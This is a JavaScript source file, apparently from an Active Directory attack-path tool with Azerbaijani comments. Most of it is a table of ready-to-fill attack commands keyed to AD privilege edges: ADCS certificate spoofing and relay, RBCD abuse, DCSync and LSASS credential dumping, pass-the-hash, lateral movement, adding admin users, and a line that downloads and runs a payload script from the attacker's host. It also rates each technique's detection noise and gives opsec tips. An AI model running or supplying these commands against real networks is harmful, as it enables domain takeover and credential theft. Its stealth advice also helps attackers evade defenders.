                    type: 'Certipy',
                    cmd: 'certipy find -u {attacker}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable',
                    desc: 'Find vulnerable certificate templates'
                },
                {
                    type: 'Certipy',
                    cmd: 'certipy req -u {attacker}@{domain} -p {password} -ca DOMAIN-CA -template VulnTemplate -upn {target}@{domain} -dc-ip {dc_ip}',
                    desc: 'Request certificate with spoofed SAN (UPN)'
                },
                {
                    type: 'Certipy',
                    cmd: 'certipy auth -pfx {target}.pfx -dc-ip {dc_ip}',
                    desc: 'Authenticate with obtained certificate'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe asktgt /user:{target} /certificate:<base64> /getcredentials /show',
                    desc: 'Get TGT and NTLM hash with certificate'
                },
                {
                    type: 'Certify',
                    cmd: 'Certify.exe find /vulnerable',
                    desc: 'Enumerate vulnerable templates (Windows)'
                },
                {
                    type: 'Certify',
                    cmd: 'Certify.exe request /ca:DC01\\DOMAIN-CA /template:VulnTemplate /altname:{target}',
                    desc: 'Request cert with alternate name (Windows)'
                },
                {
                    type: 'Certipy',
                    cmd: 'certipy req -u {attacker}@{domain} -p {password} -ca DOMAIN-CA -template VulnTemplate -dns {target}.{domain} -dc-ip {dc_ip}',
                    desc: 'Request cert with spoofed DNS SAN'
                },
                {
                    type: 'Impacket',
                    cmd: 'KRB5CCNAME={target}.ccache python3 secretsdump.py -k -no-pass {domain}/{target}@DC01.{domain}',
                    desc: 'DCSync using TGT from certificate auth'
                },
                {
                    type: 'Certipy',
                    cmd: 'certipy account create -u {attacker}@{domain} -p {password} -user "FakeMachine$" -dns "FakeMachine.{domain}" -dc-ip {dc_ip}',
                    desc: 'Create machine account for ESC1 escalation'
                }
            ]
        },
        'ESC4': {
            name: 'ESC4 - Template Write Access',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 10.0,
            noise: 5.0,
            noise_reason: 'Template modification generates event 4662 on CA object; stealthy if template is restored after use — most SOCs do not monitor CN=Certificate Templates container changes in real time',
            description: 'Attacker can modify a certificate template (WriteDACL/WriteProperty on template)',
            impact: 'Can enable SAN spoofing on any template to escalate to Domain Admin',
            commands: [
                {
                    type: 'Certipy',
                    cmd: 'certipy template -u {attacker}@{domain} -p {password} -template VulnTemplate -save-old -dc-ip {dc_ip}',
                    desc: 'Backup original template config'
                },
                {
                    type: 'Certipy',
                    cmd: 'certipy template -u {attacker}@{domain} -p {password} -template VulnTemplate -configuration <ESC1_config>',
                    desc: 'Modify template to enable SAN spoofing (ESC1)'
                },
                {
                    type: 'Certipy',
                    cmd: 'certipy req -u {attacker}@{domain} -p {password} -ca DOMAIN-CA -template VulnTemplate -upn {target}@{domain} -dc-ip {dc_ip}',
                    desc: 'Request cert as DA after template modification'
                },
                {
                    type: 'Certify',
                    cmd: 'Certify.exe find /showAllPermissions',
                    desc: 'Find templates with write permissions'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC={domain_dns}" -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" }',
                    desc: 'Enumerate template write permissions via PowerView'
                },
                {
                    type: 'Certipy',
                    cmd: 'certipy template -u {attacker}@{domain} -p {password} -template VulnTemplate -configuration <old_config>',
                    desc: 'Restore original template after attack (opsec)'
                }
            ]
        },
        'ESC8': {
            name: 'ESC8 - ADCS HTTP Relay',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 10.0,
            noise: 8.0,
            noise_reason: 'Requires triggering DC authentication (PrinterBug/PetitPotam) which generates high-noise SMB/RPC connection from DC to attacker — detectable via network monitoring and event 4624 (unusual DC outbound auth)',
            description: 'ADCS Web Enrollment enabled without HTTPS or EPA — relay to CA',
            impact: 'Relay DC machine account auth to CA to get a certificate for DC, then DCSync',
            commands: [
                {
                    type: 'Certipy',
                    cmd: 'certipy find -u {attacker}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable',
                    desc: 'Identify ESC8 vulnerable ADCS web enrollment'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 ntlmrelayx.py -t http://<CA_server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController',
                    desc: 'Start NTLM relay to ADCS HTTP endpoint'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 printerbug.py {domain}/{attacker}:{password}@DC01.{domain} <attacker_ip>',
                    desc: 'Trigger DC to connect to attacker (PrinterBug)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 PetitPotam.py <attacker_ip> DC01.{domain}',
                    desc: 'Trigger DC auth via PetitPotam'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe asktgt /user:DC01$ /certificate:<b64_from_relay> /getcredentials /show',
                    desc: 'Get TGT and NTLM for DC machine account'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py -k -no-pass {domain}/DC01$@DC01.{domain}',
                    desc: 'DCSync using DC TGT from certificate'
                }
            ]
        },
        'RBCD': {
            name: 'Resource-Based Constrained Delegation',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 9.5,
            noise: 9.0,
            noise_reason: 'Machine account creation (if MAQ used) logs event 4741; msDS-AllowedToActOnBehalfOfOtherIdentity write logs 5136; S4U2Proxy chain generates multiple Kerberos tickets (4768/4769/4770) — highly detectable in mature environments',
            description: 'Attacker can write msDS-AllowedToActOnBehalfOfOtherIdentity on target',
            impact: 'Can impersonate any domain user (including DA) against the target machine',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'New-MachineAccount -MachineAccount FakeComputer -Password (ConvertTo-SecureString "{password}" -AsPlainText -Force)',
                    desc: 'Create a new machine account (if MachineAccountQuota > 0)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 addcomputer.py -computer-name "FakeComputer$" -computer-pass {password} -dc-ip {dc_ip} {domain}/{attacker}:{password}',
                    desc: 'Add machine account remotely (Linux)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 rbcd.py -delegate-to "{target}$" -delegate-from "FakeComputer$" -action write {domain}/{attacker}:{password} -dc-ip {dc_ip}',
                    desc: 'Set RBCD — allow FakeComputer to delegate to target'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 getST.py -spn cifs/{target}.{domain} -impersonate Administrator {domain}/FakeComputer$:{password} -dc-ip {dc_ip}',
                    desc: 'Get service ticket impersonating Administrator'
                },
                {
                    type: 'Impacket',
                    cmd: 'KRB5CCNAME=Administrator.ccache python3 secretsdump.py -k -no-pass {domain}/Administrator@{target}.{domain}',
                    desc: 'Dump secrets on target using impersonated ticket'
                },
                {
                    type: 'Windows',
                    cmd: 'Rubeus.exe s4u /user:FakeComputer$ /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/{target}.{domain} /ptt',
                    desc: 'Full RBCD S4U2Self/S4U2Proxy chain (Windows)'
                },
                {
                    type: 'PowerShell',
                    cmd: '$AttackerSid = (Get-DomainComputer FakeComputer).objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSid)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Set-DomainObject -Identity {target} -Set @{"msds-allowedtoactonbehalfofotheridentity"=$SDBytes}',
                    desc: 'Manually set RBCD attribute via PowerView'
                }
            ]
        },
        'DCSync': {
            name: 'DCSync',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 10.0,
            noise: 7.0,
            noise_reason: 'Triggers event 4662 with GUID for DS-Replication-Get-Changes-All on DC; non-DC account performing replication is a known detection signature in Defender for Identity and Sentinel',
            description: 'Account has DS-Replication rights to replicate domain secrets',
            impact: 'Dump NTLM hashes and Kerberos keys for all domain accounts without logging on to DC',
            commands: [
                {
                    type: 'Mimikatz',
                    cmd: 'lsadump::dcsync /domain:{domain} /user:Administrator',
                    desc: 'Dump Administrator hash'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'lsadump::dcsync /domain:{domain} /user:krbtgt',
                    desc: 'Dump krbtgt hash for Golden Ticket'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'lsadump::dcsync /domain:{domain} /all /csv',
                    desc: 'Dump entire domain to CSV'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Full domain hash dump (Linux)'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {dc_ip} -u {attacker} -p {password} --ntds',
                    desc: 'CME NTDS dump'
                },
                {
                    type: 'SharpSecDump',
                    cmd: 'SharpSecDump.exe -target={dc_ip} -u={attacker} -p={password} -d={domain}',
                    desc: 'C# DCSync alternative'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Invoke-DCSync -Domain {domain} -DomainController DC01.{domain} -User krbtgt',
                    desc: 'Empire Invoke-DCSync module'
                }
            ]
        },
        'Owns': {
            name: 'Owns',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 9.9,
            noise: 7.0,
            noise_reason: 'Owner-based DACL modification triggers event 4670 and 5136; ownership changes themselves (4672) are logged but rarely alerted on — medium noise depending on SOC maturity',
            description: 'Attacker owns the target object (Owner in ACL)',
            impact: 'Object owner can modify DACL and grant themselves any right including GenericAll',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {attacker} -Rights All',
                    desc: 'Grant GenericAll to attacker via DACL modification'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 owneredit.py -action write -new-owner {attacker} -target {target} {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Confirm/change ownership of target object'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 dacledit.py -action write -rights FullControl -principal {attacker} -target {target} {domain}/{attacker}:{password}@{dc_ip}',
                    desc: 'Modify DACL as object owner'
                },
                {
                    type: 'PowerShell',
                    cmd: '$Acl = Get-Acl -Path "AD:\\{target}"; $Acl.SetOwner([System.Security.Principal.NTAccount]"{attacker}"); Set-Acl -Path "AD:\\{target}" -AclObject $Acl',
                    desc: 'Take ownership and modify ACL via .NET'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Set-DomainObjectOwner -Identity {target} -OwnerIdentity {attacker}',
                    desc: 'Confirm ownership via PowerView'
                },
                {
                    type: 'SharpACL',
                    cmd: 'SharpACL.exe --action setOwner --principal {attacker} --target {target} --domain {domain}',
                    desc: 'Set/confirm owner with SharpACL'
                }
            ]
        },
        'AllExtendedRights': {
            name: 'AllExtendedRights',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Critical',
            score: 9.7,
            noise: 7.5,
            noise_reason: 'Depends on technique used — password reset is high noise (4723/4724), DCSync is medium (4662), LAPS read is low (no dedicated event); combined potential makes overall noise significant',
            description: 'Has all extended rights on target object',
            impact: 'Allows password resets, DCSync, reading LAPS, and certificate enrollment',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Set-ADAccountPassword -Identity "{target}" -NewPassword (ConvertTo-SecureString "{password}" -AsPlainText -Force) -Reset',
                    desc: 'Force password reset (if target is user)'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Add-DomainObjectAcl -TargetIdentity "DC={domain_dns}" -PrincipalIdentity {attacker} -Rights DCSync',
                    desc: 'Grant DCSync rights (if target is domain object)'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Get-ADComputer -Identity {target} -Properties "ms-Mcs-AdmPwd" | Select-Object ms-Mcs-AdmPwd',
                    desc: 'Read LAPS password (if target is computer)'
                },
                {
                    type: 'rpcclient',
                    cmd: 'rpcclient -U "{domain}\\{attacker}%{password}" {dc_ip} -c "setuserinfo2 {target} 23 {password}"',
                    desc: 'Password change via SAMRPC'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec ldap {dc_ip} -u {attacker} -p {password} --laps --computer {target}',
                    desc: 'LAPS password read via CME LDAP'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py {domain}/{attacker}:{password}@{dc_ip} -just-dc-user {target}',
                    desc: 'DCSync target user hash'
                }
            ]
        },
        'HasSession': {
            name: 'HasSession',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'High',
            score: 8.5,
            noise: 8.5,
            noise_reason: 'LSASS access via Mimikatz/ProcDump is heavily detected (event 4656/10 on LSASS handle) by Defender, EDR, and Credential Guard; remote secretsdump generates SMB/SAMRPC traffic logged on target host',
            description: 'A privileged user has an active session on this machine',
            impact: 'Attacker with local admin can dump credentials from memory (LSASS)',
            commands: [
                {
                    type: 'Mimikatz',
                    cmd: 'sekurlsa::logonpasswords',
                    desc: 'Dump credentials from LSASS memory'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'sekurlsa::wdigest',
                    desc: 'Dump WDigest plaintext credentials (if enabled)'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'sekurlsa::tickets /export',
                    desc: 'Export Kerberos tickets from memory'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {target} -u {attacker} -p {password} -M lsassy',
                    desc: 'Remote LSASS dump via lsassy module'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {target} -u {attacker} -p {password} --lsa',
                    desc: 'Dump LSA secrets remotely'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py {domain}/{attacker}:{password}@{target}',
                    desc: 'Remote secrets dump via Impacket'
                },
                {
                    type: 'Windows',
                    cmd: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full',
                    desc: 'Create LSASS mini-dump (low detection)'
                },
                {
                    type: 'Windows',
                    cmd: 'SharpDump.exe',
                    desc: 'C# LSASS dump tool'
                },
                {
                    type: 'Windows',
                    cmd: 'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
                    desc: 'Sysinternals procdump LSASS'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Invoke-Mimikatz -ComputerName {target} -Command "sekurlsa::logonpasswords"',
                    desc: 'Remote Mimikatz via PowerShell remoting'
                }
            ]
        },
        'AdminTo': {
            name: 'AdminTo',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'High',
            score: 9.0,
            noise: 7.0,
            noise_reason: 'SMB admin access generates event 4624 (logon type 3) and 4648; psexec creates a service (7045) — very noisy; wmiexec/smbexec are quieter but still trigger network auth events',
            description: 'Attacker is local administrator on target computer',
            impact: 'Full local access: credential dumping, lateral movement, persistence',
            commands: [
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {target} -u {attacker} -p {password} --shares',
                    desc: 'Verify admin access and enumerate shares'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 wmiexec.py {domain}/{attacker}:{password}@{target}',
                    desc: 'Remote command execution via WMI'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 psexec.py {domain}/{attacker}:{password}@{target}',
                    desc: 'Remote shell via PsExec (noisy)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 smbexec.py {domain}/{attacker}:{password}@{target}',
                    desc: 'Remote execution via SMBExec (stealthy)'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 secretsdump.py {domain}/{attacker}:{password}@{target}',
                    desc: 'Dump all secrets from remote machine'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {target} -u {attacker} -p {password} -M lsassy',
                    desc: 'Remote LSASS dump via CME'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'sekurlsa::logonpasswords',
                    desc: 'Dump credentials from LSASS (on target)'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {target} -u {attacker} -p {password} -x "whoami /all"',
                    desc: 'Execute command remotely via SMB'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Enter-PSSession -ComputerName {target} -Credential (Get-Credential)',
                    desc: 'Interactive PowerShell remote session'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 atexec.py {domain}/{attacker}:{password}@{target} whoami',
                    desc: 'Command execution via Task Scheduler'
                }
            ]
        },
        'CanPSRemote': {
            name: 'CanPSRemote',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'High',
            score: 7.5,
            noise: 6.5,
            noise_reason: 'WinRM sessions generate event 4624 (logon type 3) and WSMan operational logs; PowerShell script block logging (event 4104) captures commands — moderate noise, especially with ScriptBlock logging enabled',
            description: 'Attacker can connect via PowerShell Remoting (WinRM)',
            impact: 'Remote interactive session on target machine — credential theft and lateral movement',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: 'Enter-PSSession -ComputerName {target} -Credential (New-Object PSCredential("{domain}\\{attacker}", (ConvertTo-SecureString "{password}" -AsPlainText -Force)))',
                    desc: 'Interactive PS remote session'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Invoke-Command -ComputerName {target} -Credential $Cred -ScriptBlock { whoami; hostname; ipconfig }',
                    desc: 'Execute commands via PSRemoting'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec winrm {target} -u {attacker} -p {password} -x "whoami"',
                    desc: 'Test WinRM access and execute command'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 evil-winrm -i {target} -u {attacker} -p {password}',
                    desc: 'Interactive WinRM shell (Linux)'
                },
                {
                    type: 'PowerShell',
                    cmd: 'Invoke-Command -ComputerName {target} -Credential $Cred -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString("http://{attacker}/payload.ps1") }',
                    desc: 'Drop payload via PSRemoting'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec winrm {target} -u {attacker} -H <NTLM_hash>',
                    desc: 'Pass-the-Hash via WinRM'
                }
            ]
        },
        'CanRDP': {
            name: 'CanRDP',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'Medium',
            score: 6.5,
            noise: 9.5,
            noise_reason: 'RDP creates interactive logon event 4624 (type 10) and user profile load — extremely visible; leaves session artifacts, TerminalServices-LocalSessionManager logs (event 21/25); PTH-RDP also triggers specific Kerberos events',
            description: 'Attacker can connect via Remote Desktop Protocol',
            impact: 'Interactive GUI session on target — credential theft, screen capture, lateral movement',
            commands: [
                {
                    type: 'Windows',
                    cmd: 'mstsc /v:{target}',
                    desc: 'Connect via RDP client'
                },
                {
                    type: 'Linux',
                    cmd: 'xfreerdp /u:{attacker} /p:{password} /d:{domain} /v:{target}',
                    desc: 'Connect via xfreerdp (Linux)'
                },
                {
                    type: 'Linux',
                    cmd: 'rdesktop -u {attacker} -p {password} -d {domain} {target}',
                    desc: 'Connect via rdesktop'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec rdp {target} -u {attacker} -p {password}',
                    desc: 'Test RDP access via CME'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 rdp_check.py {domain}/{attacker}:{password}@{target}',
                    desc: 'Verify RDP credentials (Linux)'
                },
                {
                    type: 'Linux',
                    cmd: 'xfreerdp /u:{attacker} /pth:<NTLM_hash> /d:{domain} /v:{target} /cert-ignore',
                    desc: 'Pass-the-Hash RDP (RestrictedAdmin mode)'
                },
                {
                    type: 'Mimikatz',
                    cmd: 'sekurlsa::logonpasswords',
                    desc: 'Dump credentials after RDP session'
                }
            ]
        },
        'ExecuteDCOM': {
            name: 'ExecuteDCOM',
            guid: '00000000-0000-0000-0000-000000000000',
            risk: 'High',
            score: 7.8,
            noise: 5.5,
            noise_reason: 'DCOM exec uses legitimate RPC/DCOM channels — no dedicated event for DCOM lateral movement by default; process creation (4688) on target if audited; less noisy than PsExec/WMI but still detectable by EDR behavioral rules',
            description: 'Attacker can execute commands via DCOM on target',
            impact: 'Remote code execution without SMB exec — more stealthy lateral movement',
            commands: [
                {
                    type: 'PowerShell',
                    cmd: '$Com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "{target}")); $Com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\\output.txt", "7")',
                    desc: 'DCOM exec via MMC20.Application'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 dcomexec.py {domain}/{attacker}:{password}@{target} "whoami" -object MMC20',
                    desc: 'DCOM execution via Impacket'
                },
                {
                    type: 'CrackMapExec',
                    cmd: 'crackmapexec smb {target} -u {attacker} -p {password} -x "whoami" --exec-method mmcexec',
                    desc: 'CME DCOM/MMC execution'
                },
                {
                    type: 'PowerShell',
                    cmd: '$Com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("ShellWindows", "{target}")); $Com.Item().Document.Application.ShellExecute("cmd.exe","/c calc","C:\\Windows\\System32",$null,0)',
                    desc: 'DCOM exec via ShellWindows'
                },
                {
                    type: 'Impacket',
                    cmd: 'python3 dcomexec.py {domain}/{attacker}:{password}@{target} "net user {attacker} {password} /add && net localgroup Administrators {attacker} /add"',
                    desc: 'Add admin user via DCOM'
                }
            ]
        }
    }
};

// ── Helper function: Template-dən dinamik komanda yaradır ──
function generateCommands(edgeName, params = {}) {
    const hints = getHintByEdgeName(edgeName);
    if (!hints || !hints.commands) return [];

    const defaults = {
        attacker: 'attacker',
        password: 'Password1',
        domain: 'domain.local',
        domain_dns: 'domain,local',
        target: params.target || 'TargetUser',
        source: params.source || 'SourceUser',
        dc_ip: params.dc || params.dc_ip || '192.168.1.1',
        dc: params.dc || params.dc_ip || '192.168.1.1',
        ...params
    };

    // Əgər komandalar string olarsa (köhnə format), düzəlt
    if (typeof hints.commands[0] === 'string') {
        return hints.commands.map(cmd => {
            let rendered = cmd;
            Object.keys(defaults).forEach(key => {
                const regex = new RegExp(`\\{${key}\\}`, 'g');
                rendered = rendered.replace(regex, defaults[key]);
            });
            return { type: 'Command', cmd: rendered, desc: '' };
        });
    }

    // Yeni format - object array
    return hints.commands.map(item => {
        let rendered = item.cmd;
        Object.keys(defaults).forEach(key => {
            const regex = new RegExp(`\\{${key}\\}`, 'g');
            rendered = rendered.replace(regex, defaults[key]);
        });
        return {
            type: item.type || 'Command',
            cmd: rendered,
            desc: item.desc || ''
        };
    });
}

// ── Public API ──────────────────────────────────────────
window.GRAPH_HINTS = GRAPH_HINTS;
window.generateCommands = generateCommands;

// ── Get hint by edge name ───────────────────────────────
function getHintByEdgeName(edgeName) {
    if (!edgeName) return null;
    const rights = GRAPH_HINTS.rights || {};

    // Direct key
    if (rights[edgeName]) return rights[edgeName];

    const lookup = String(edgeName).toLowerCase().trim();

    // 1) Case-insensitive exact match
    for (const k of Object.keys(rights)) {
        if (k.toLowerCase() === lookup) return rights[k];
    }

    // 2) Normalized match (remove spaces, dashes, underscores)
    const norm = lookup.replace(/[\s\-_]/g, '');
    for (const k of Object.keys(rights)) {
        if (k.toLowerCase().replace(/[\s\-_]/g, '') === norm) return rights[k];
    }

    // 3) Substring matches (allow keys like 'AS-REP Roasting' to match 'ASREP')
    for (const k of Object.keys(rights)) {
        const kl = k.toLowerCase();
        if (kl.includes(lookup) || lookup.includes(kl)) return rights[k];
    }

    return null;
}

window.getHintByEdgeName = getHintByEdgeName;

// ── Generate HTML for Attack Vectors ────────────────────
function renderAttackVectors(edgeName, sourceNode, targetNode) {
    const hint = getHintByEdgeName(edgeName);
    
    if (!hint || !hint.commands || hint.commands.length === 0) {
        return `<div class="nc-attack-empty">
                    <div class="nc-attack-empty-icon">⊡</div>
                    <div class="nc-attack-empty-text">No attack vectors for <strong>"${edgeName}"</strong></div>
                </div>`;
    }

    const params = {
        target: targetNode?.label || targetNode?.id || targetNode?.name || 'Target',
        source: sourceNode?.label || sourceNode?.id || sourceNode?.name || 'Source',
        domain: targetNode?.domain || sourceNode?.domain || 'domain.local',
        domain_dns: 'domain,local',
        attacker: sourceNode?.label || sourceNode?.id || sourceNode?.name || 'attacker',
        password: 'Password123!',
        dc_ip: targetNode?.dc_ip || sourceNode?.dc_ip || targetNode?.dc || sourceNode?.dc || '192.168.1.1',
        dc: targetNode?.dc || sourceNode?.dc || targetNode?.dc_ip || sourceNode?.dc_ip || '192.168.1.1'
    };

    const commands = generateCommands(edgeName, params);
    
    if (commands.length === 0) return '<div class="nc-attack-empty"><div class="nc-attack-empty-text">No commands available</div></div>';

    // Risk indicator
    const riskColor = hint.risk === 'Critical' ? 'critical' : hint.risk === 'High' ? 'high' : 'medium';

    // Noise indicator
    const noiseVal = hint.noise ?? null;
    const noiseLevel = noiseVal === null ? 'unknown'
        : noiseVal >= 8 ? 'high'
        : noiseVal >= 5 ? 'medium'
        : 'low';
    const noiseLevelLabel = noiseVal === null ? 'Unknown'
        : noiseVal >= 8 ? 'High'
        : noiseVal >= 5 ? 'Medium'
        : 'Low';
    const noiseHtml = noiseVal !== null ? `
        <div class="nc-attack-noise nc-noise-${noiseLevel}" title="${hint.noise_reason || ''}">
            <span class="nc-noise-icon">\u{1F4E1}</span>
            <span class="nc-noise-label">Noise</span>
            <span class="nc-noise-bar">
                ${Array.from({length: 10}, (_, i) =>
                    `<span class="nc-noise-pip${i < Math.round(noiseVal) ? ' nc-noise-pip-active' : ''}"></span>`
                ).join('')}
            </span>
            <span class="nc-noise-score">${noiseVal.toFixed(1)}/10</span>
            <span class="nc-noise-tag">${noiseLevelLabel}</span>
        </div>` : '';

    let html = `
    <div class="nc-attack-header">
        <div class="nc-attack-risk-badge nc-risk-${riskColor}">
            <span class="nc-risk-dot"></span>
            <span class="nc-risk-text">${hint.risk}</span>
        </div>
        <div class="nc-attack-impact" title="${hint.impact || ''}">${hint.description}</div>
        ${noiseHtml}
    </div>
    <div class="nc-attack-vectors-list">`;
    
    // Group commands by type
    const commandsByType = {};
    commands.forEach(cmd => {
        const type = cmd.type || 'Command';
        if (!commandsByType[type]) commandsByType[type] = [];
        commandsByType[type].push(cmd);
    });

    let cmdIndex = 1;
    Object.keys(commandsByType).forEach(type => {
        const cmds = commandsByType[type];
        
        html += `
        <div class="nc-attack-group">
            <div class="nc-attack-group-header">
                <span class="nc-attack-group-icon">▸</span>
                <span class="nc-attack-group-name">${type}</span>
                <span class="nc-attack-group-count">${cmds.length}</span>
            </div>
            <div class="nc-attack-group-items">`;
        
        cmds.forEach(cmdObj => {
            html += `
            <div class="nc-attack-vector-item">
                <div class="nc-attack-vector-meta">
                    <span class="nc-vector-idx">${String(cmdIndex).padStart(2, '0')}</span>
                    ${cmdObj.desc ? `<span class="nc-vector-desc" title="${escapeHtml(cmdObj.desc)}">${escapeHtml(cmdObj.desc)}</span>` : ''}
                </div>
                <div class="nc-attack-vector-cmd-wrap">
                    <code class="nc-vector-cmd">${escapeHtml(cmdObj.cmd)}</code>
                    <button class="nc-vector-copy" data-cmd="${escapeHtml(cmdObj.cmd)}" title="Copy to clipboard">
                        <span class="nc-copy-icon">📋</span>
                    </button>
                </div>
            </div>`;
            cmdIndex++;
        });
        
        html += `</div></div>`;
    });

    html += '</div>';

    return html;
}

window.renderAttackVectors = renderAttackVectors;

// ── HTML escape helper ──────────────────────────────────
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

window.escapeHtml = escapeHtml;